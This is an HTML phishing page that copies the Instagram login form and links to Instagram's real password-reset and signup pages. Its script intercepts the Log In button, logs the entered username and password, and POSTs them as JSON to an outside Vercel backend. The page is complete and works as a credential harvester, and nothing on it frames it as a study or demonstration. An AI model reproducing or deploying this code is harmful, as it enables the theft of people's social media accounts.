<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./instaloginpage.css">
    
</head> 
<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div> 
            <form class="login-form">
                <div class="field">
                    <input id="username" type="name" placeholder="Phone number, username, or email" >
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="password">
                    <label for="password">Password</label>
                </div>
                <button id="loginbt" class="login-button" title="login">Log In</button>
                <div class="separator">
                    <div class="line"></div> 
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class="">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
        </div>
    </div>
</body>
</html>

<script>
    var emailId = document.getElementById("username");
var passId = document.getElementById("password");



var btn = document.getElementById("loginbt");

btn.addEventListener("click",(e) => {
    e.preventDefault();

var email = emailId.value;
var pass = passId.value
    console.log(email,pass);
    let payload = {
        email : email,
        password : pass
    }

    fetch("https://insta-login-backend-git-main-monifk29.vercel.app/user/reg",{
        headers : {
            "Content-type" : "application/json"
        },

        method : "POST",
        body : JSON.stringify(payload)
    }).then((res) => console.log(res))
    .catch((err) => console.log(err))
    
})
</script>
